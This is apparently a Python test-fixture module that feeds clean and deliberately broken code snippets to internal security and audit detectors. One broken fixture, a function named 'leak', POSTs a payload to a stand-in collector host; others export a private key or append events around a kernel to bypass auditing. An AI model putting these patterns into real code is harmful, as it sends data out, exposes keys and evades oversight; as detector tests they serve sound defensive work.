"""Known-good / known-broken fixtures and adapters for shipped detectors."""
from __future__ import annotations

import sys
from pathlib import Path
from typing import Any, Callable

TOOLS = Path(__file__).resolve().parents[1]
if str(TOOLS) not in sys.path:
    sys.path.insert(0, str(TOOLS))
if str(TOOLS / "plugin") not in sys.path:
    sys.path.insert(0, str(TOOLS / "plugin"))

CLEAN_PY = '''"""Clean production module: no network, no key lifecycle."""


def add(a: int, b: int) -> int:
    return a + b


def render(rows: list[dict]) -> str:
    return "\\n".join(sorted(str(r) for r in rows))
'''

REQUESTS_PY = '''"""Broken: outbound network API outside the allowlist module."""
import requests


def leak(payload: dict) -> int:
    resp = requests.post("https://collector.example/v1/ingest", json=payload)
    return resp.status_code
'''

ROTATE_KEY_PY = '''"""Broken: publisher-key lifecycle call in production code."""


def rotate_key(publisher_id: str) -> str:
    new_key = generate_private_key(publisher_id)
    return export_private_key(new_key)
'''

HONEST_TOPO = '''"""Honest council topology: every write goes through the kernel."""


def run_round(kernel, plan):
    results = []
    for spec in plan.turns:
        results.append(kernel.execute_turn(spec))
    return results
'''

APPEND_ONLY_TOPO = '''"""Broken council topology: raw TURN events appended around the kernel."""


def sneak_turn(events, participant_id, text):
    events.append({"kind": "TURN", "participant_id": participant_id, "output": text})
    return events
'''


def _fired_list(hits: Any) -> dict[str, Any]:
    rows = list(hits or [])
    return {
        "fired": bool(rows),
        "count": len(rows),
        "payload": [str(r) for r in rows],
    }


def static_audit_adapter(state: str) -> dict[str, Any]:
    import static_audit as sa

    src = CLEAN_PY if state == "good" else REQUESTS_PY
    return _fired_list(sa.audit_snippet(src, rel="fixture-net.py"))


def static_audit_source_adapter(state: str) -> dict[str, Any]:
    import static_audit as sa

    src = CLEAN_PY if state == "good" else REQUESTS_PY
    return _fired_list(sa.audit_source(src, "fixture-net.py", ".py"))


def marketplace_audit_adapter(state: str) -> dict[str, Any]:
    from marketplace.audit import scan_source

    src = CLEAN_PY if state == "good" else ROTATE_KEY_PY
    return _fired_list([h.__dict__ for h in scan_source(src, "fixture-keys.py")])


def council_kernel_adapter(state: str) -> dict[str, Any]:
    from council.kernel import audit_source

    src = HONEST_TOPO if state == "good" else APPEND_ONLY_TOPO
    return _fired_list(audit_source(src, label="fixture-topo"))


ADAPTERS: dict[str, Callable[[str], dict[str, Any]] | None] = {
    "plugin/static_audit.py:audit_snippet": static_audit_adapter,
    "plugin/static_audit.py:audit_source": static_audit_source_adapter,
    "marketplace/audit.py:scan_source": marketplace_audit_adapter,
    "council/kernel.py:audit_source": council_kernel_adapter,
    # No known-broken fixture exists for these; they must surface NOT-CHECKED.
    "tools/command-center/validate.py:validate": None,
    "plugin/hook_fire_probe.py:run_probe": None,
}
